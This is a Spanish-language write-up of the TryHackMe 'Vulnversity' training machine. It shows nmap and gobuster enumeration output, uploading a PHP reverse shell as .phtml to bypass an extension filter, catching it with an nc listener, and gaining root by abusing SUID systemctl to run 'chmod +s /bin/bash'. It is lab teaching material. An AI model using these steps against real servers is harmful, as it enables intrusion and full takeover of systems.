---
title: TryHackMe Vulnversity Writeup
published: true
---

La máquina Vulnversity, es una máquina de TryHackMe en la que mediante el seguimiento de la room en TryHackMe conseguiremos resolver una serie de preguntas que nos plantean:

* ¿Cuántos puertos están abiertos?<br>
    *
* ¿Qué versión del Proxy está corriendo?<br>
    *.*.**
* ¿Cuántos puertos escaneará nmap si se usa -p-400?<br>
    ***
* Usando -n, ¿qué NO aplicará nmap?<br>
    ***
* ¿Cuál es el sistema operativo que está corriendo? <br>
    ******
* ¿En qué puerto está corriendo el servidor web?<br>                 
    ****
* ¿Cuál es el directorio que tiene una página de upload?<br>
    /*******/
* ¿Qué tipo de archivo (extensión) está bloqueado?<br>
    ****
* ¿Qué tipo de archivo (extensión) está permitido?<br>
    *****
* ¿Cuál es el nombre del usuario que maneja el servidor web?<br>
    ****
* ¿User flag?<br>
    ????????????????????????
* ¿Qué archivo con permiso SUID no és normal?<br>
    /***/*********
* ¿Root flag?<br>
    ????????????????????????


# [](#header-1)Enumeración

La enumeración se trata de una de las fases principales, en las que recolectamos la máxima información posible de la máquina víctima.

Usaremos nmap para analizar las seis primeras preguntas: 

```bash
nmap -p- --open --min-rate 5000 -vvv -n $IP-VICTIMA -oG allPorts
```

*  Escaneo todos los puertos abiertos: -p- --open

*  Mediante --min-rate 5000 indicamos que queremos emitir paquetes no más lentos que 5000 paquetes por segundo.

*  Triple verbose (-vvv) para que vaya reportando por consola los puertos abiertos y no tener que esperar al final del escaneo.

*  Para que el escaneo no aplique resolución DNS usamos -n

*  En mi caso exporto los puertos abiertos en formato grepeable (-oG) al archivo allPorts

```bash
❯ nmap -p- --open --min-rate 5000 -vvv -n -Pn 10.10.244.174 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-25 12:16 EDT
Initiating Connect Scan at 12:16
Scanning 10.10.244.174 [65535 ports]
Discovered open port 22/tcp on 10.10.244.174
Discovered open port 445/tcp on 10.10.244.174
Discovered open port 139/tcp on 10.10.244.174
Discovered open port 21/tcp on 10.10.244.174
Discovered open port 3128/tcp on 10.10.244.174
Discovered open port 3333/tcp on 10.10.244.174
Completed Connect Scan at 12:16, 12.55s elapsed (65535 total ports)
Nmap scan report for 10.10.244.174
Host is up, received user-set (0.054s latency).
Scanned at 2022-10-25 12:16:28 EDT for 13s
Not shown: 65529 closed tcp ports (conn-refused)
PORT     STATE SERVICE      REASON
21/tcp   open  ftp          syn-ack
22/tcp   open  ssh          syn-ack
139/tcp  open  netbios-ssn  syn-ack
445/tcp  open  microsoft-ds syn-ack
3128/tcp open  squid-http   syn-ack
3333/tcp open  dec-notes    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.60 seconds
```

Hay 6 puertos abiertos.

```bash
❯ nmap -sCV -p21,22,139,445,3128,3333 10.10.244.174 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-25 12:18 EDT
Nmap scan report for 10.10.244.174
Host is up (0.053s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2022-10-25T12:19:17-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2022-10-25T16:19:16
|_  start_date: N/A
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.56 seconds
[1]    34087 segmentation fault  nmap -sCV -p21,22,139,445,3128,3333 10.10.244.174 -oN targeted

```

Con el escaneo de servicio y versiones podemos ver que la versión es la 3.5.12, que estamos frente a un Ubuntu y que el puerto por le que corre el servidor web es el 3333.

Sabemos independientemente de esto que -n No aplica resolución DNS y que con -p-400 escaneará los 400 puertos más comunes.

# [](#header-1)Acceso al sistema 

Para localizar los directorios ocultos usaremos gobuster:

```bash
❯ gobuster dir -u http://10.10.244.174:3333 -w /usr/share/wordlists/dirb/common.txt -t 25 -x php,html,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.244.174:3333
[+] Method:                  GET
[+] Threads:                 25
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
2022/10/25 12:22:14 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 299]
/.htaccess.html       (Status: 403) [Size: 304]
/.htaccess.txt        (Status: 403) [Size: 303]
/.htaccess.php        (Status: 403) [Size: 303]
/.htpasswd            (Status: 403) [Size: 299]
/.htpasswd.php        (Status: 403) [Size: 303]
/.htpasswd.html       (Status: 403) [Size: 304]
/.htpasswd.txt        (Status: 403) [Size: 303]
/.hta                 (Status: 403) [Size: 294]
/.hta.php             (Status: 403) [Size: 298]
/.hta.html            (Status: 403) [Size: 299]
/.hta.txt             (Status: 403) [Size: 298]
/css                  (Status: 301) [Size: 319] [--> http://10.10.244.174:3333/css/]
/fonts                (Status: 301) [Size: 321] [--> http://10.10.244.174:3333/fonts/]
/images               (Status: 301) [Size: 322] [--> http://10.10.244.174:3333/images/]
/index.html           (Status: 200) [Size: 33014]                                      
/index.html           (Status: 200) [Size: 33014]                                      
/internal             (Status: 301) [Size: 324] [--> http://10.10.244.174:3333/internal/]
/js                   (Status: 301) [Size: 318] [--> http://10.10.244.174:3333/js/]      
/server-status        (Status: 403) [Size: 303]                                          
                                                                                         
===============================================================
2022/10/25 12:22:57 Finished
===============================================================

```

Buscando los directorios nos fijamos que el directorio /internal/ es el que presenta la página de subida de archivos.


Por norma general, los archivos .php suelen estar restringidos. Probamos en TryHackMe y resolvemos la siguiente pregunta.

Siguiendo los pasos de la room de TryHackMe, podemos observar que la extensión .phtml está permitida. 

Entonces, nos bajaremos la reverse shell de la página que nos facilita TryHackMe cambiando la IP (que deberá de ser la nuestra) y el puerto por el que estemos a la escucha.

Subimos la reverse shell y mientras estamos en escucha la ejecutamos desde /internal/uploads

```bash
❯ nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.8.4.179] from (UNKNOWN) [10.10.244.174] 38976
Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 12:27:07 up  1:49,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```
Conseguimos acceso a la máquina. Podemos ver el usuario de la siguiente manera: 

```bash
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ cd /home  
$ ls
bill
$ 
```

Conseguimos la flag del usuario:

```bash
$ cd bill
$ ls
user.txt
$ cat user.txt  
?????????????????????????
```

# [](#header-1)Escalada de privilegios 

Desde TryHackMe nos preguntan por archivos inusuales con permisos SUID. Para buscarlos haremos:

```bash
$ find / -type f -perm -4000 2>/dev/null
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/at
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/squid/pinger
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/su
/bin/ntfs-3g
/bin/mount
/bin/ping6
/bin/umount
---> /bin/systemctl
/bin/bash
/bin/ping
/bin/fusermount
/sbin/mount.cifs
$ 
```

Observamos así el directorio inusual. Sabiendo que ese archivo tiene permisos SUID, buscamos en <a href="https://gtfobins.github.io/gtfobins/systemctl/"> GTFOBins </a> y conseguimos la forma de escalar privilegios. 

Únicamente deberemos introducir el comando chmod +s /bin/bash en el apartado de "id > /tmp/output"

Por otro lado deberemos indicar la ruta absoluta de ./systemctl -> /bin/systemctl

Una vez realizado, comprobamos si tenemos el permiso s con:

```bash
$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1037528 May 16  2017 /bin/bash
```

Lo tenemos, hacemos bash -p para obtener la bash como root y conseguimos la flag de root.

```bash
$ bash -p
id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
cd /root
ls
root.txt
cat root.txt
???????????????????????
```

Muchas gracias por leer este writeup, espero que te haya gustado!
